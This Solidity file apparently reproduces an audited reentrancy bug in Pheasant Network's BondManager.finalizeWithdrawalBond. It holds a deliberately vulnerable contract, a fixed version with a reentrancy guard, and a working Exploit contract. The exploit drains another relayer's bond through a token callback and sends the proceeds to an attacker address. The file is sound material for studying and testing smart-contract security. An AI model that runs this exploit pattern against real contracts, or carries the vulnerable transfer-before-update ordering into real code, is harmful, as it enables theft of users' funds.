// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 60329 — Pheasant Network BondManager.finalizeWithdrawalBond (Quantstamp).
 * The relayer's withdrawal of exactly A tokens transfers before the request is
 * cleared. A callback token lets the relayer re-enter and pull A again until
 * only totalLocked % A remains. Here totalLocked = 100, A = 30, so 90 leaves
 * and 10 stays. 60 of that 90 belonged to another relayer.
 *
 * UPDATE_PERIOD is 0 so the matured-request check passes inside one block.
 * The delay is not the bug; the reentrancy on finalize is.
 */

interface IReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

contract CallbackToken {
    string public name = "Bond token";
    string public symbol = "BOND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (to.code.length > 0) {
            IReceiver(to).onTokenReceived(msg.sender, amount);
        }
        return true;
    }
}

contract BondManager {
    CallbackToken public token;
    uint256 public totalLocked;
    mapping(address => uint256) public bondOf;
    mapping(address => uint256) public withdrawalAmount;

    constructor(CallbackToken _token) {
        token = _token;
    }

    function depositFor(address relayer, uint256 amount) external {
        token.mint(address(this), amount);
        bondOf[relayer] += amount;
        totalLocked += amount;
    }

    function executeWithdrawBond(uint256 amount) external {
        require(bondOf[msg.sender] >= amount, "bond");
        require(withdrawalAmount[msg.sender] == 0, "pending");
        withdrawalAmount[msg.sender] = amount;
    }

    function finalizeWithdrawalBond() external {
        uint256 A = withdrawalAmount[msg.sender];
        require(A > 0, "none");
        require(token.balanceOf(address(this)) >= A, "short");
        // @> VULN:
        token.transfer(msg.sender, A);
        if (totalLocked >= A) totalLocked -= A;
        withdrawalAmount[msg.sender] = 0;
    }
}

contract BondManagerFixed {
    CallbackToken public token;
    uint256 public totalLocked;
    mapping(address => uint256) public bondOf;
    mapping(address => uint256) public withdrawalAmount;
    bool private locked;

    constructor(CallbackToken _token) {
        token = _token;
    }

    function depositFor(address relayer, uint256 amount) external {
        token.mint(address(this), amount);
        bondOf[relayer] += amount;
        totalLocked += amount;
    }

    function executeWithdrawBond(uint256 amount) external {
        require(bondOf[msg.sender] >= amount, "bond");
        withdrawalAmount[msg.sender] = amount;
    }

    function finalizeWithdrawalBond() external {
        require(!locked, "reenter");
        locked = true;
        uint256 A = withdrawalAmount[msg.sender];
        require(A > 0, "none");
        require(token.balanceOf(address(this)) >= A, "short");
        withdrawalAmount[msg.sender] = 0;
        totalLocked -= A;
        bondOf[msg.sender] -= A;
        token.transfer(msg.sender, A);
        locked = false;
    }
}

contract Exploit is IReceiver {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x8888888888888888888888888888888888888888;
    uint256 internal constant AMOUNT = 30 ether;
    uint256 internal constant VICTIM_BOND = 70 ether;

    CallbackToken public token;
    BondManager public bond;
    uint256 public pulled;

    function onTokenReceived(address, uint256) external override {
        if (token.balanceOf(address(bond)) >= AMOUNT) {
            try bond.finalizeWithdrawalBond() {} catch {}
        }
    }

    function run() external {
        token = new CallbackToken();
        bond = new BondManager(token);
        bond.depositFor(address(this), AMOUNT);
        bond.depositFor(VICTIM, VICTIM_BOND);
        bond.executeWithdrawBond(AMOUNT);
        bond.finalizeWithdrawalBond();
        pulled = token.balanceOf(address(this));
        require(pulled == 90 ether, "pulled");
        require(token.balanceOf(address(bond)) == 10 ether, "left");
        require(bond.totalLocked() == 10 ether, "accounting");
        token.transfer(ATTACKER, pulled);
    }
}
